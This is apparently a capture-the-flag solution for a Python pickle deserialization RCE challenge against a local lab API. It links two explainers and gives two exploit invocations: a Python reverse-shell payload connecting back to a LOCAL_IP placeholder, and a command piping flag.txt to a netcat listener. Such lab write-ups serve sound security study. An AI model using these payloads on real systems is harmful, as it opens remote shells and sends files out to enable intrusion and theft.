# Solution

Make sure to put the correct port/IP in the PoC example:
```python
API_BASE_URL = 'http://172.17.0.2:5000/apiv1'
```

## Resources
- [exploit-notes.hdks](https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/)
- [Pickles deserialization RCE explaination](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

## Method 1
To get a reverse shell:

```bash
python exploit.py --action exploit --payload "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"LOCAL_IP\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
```
## Method 2
To get the flag directly, start a netcat listener then get the flag:

```bash
nc -lvnp PORT 
python exploit.py --action exploit --payload "sh -c 'cat flag.txt | nc LOCAL_IP PORT'"
```


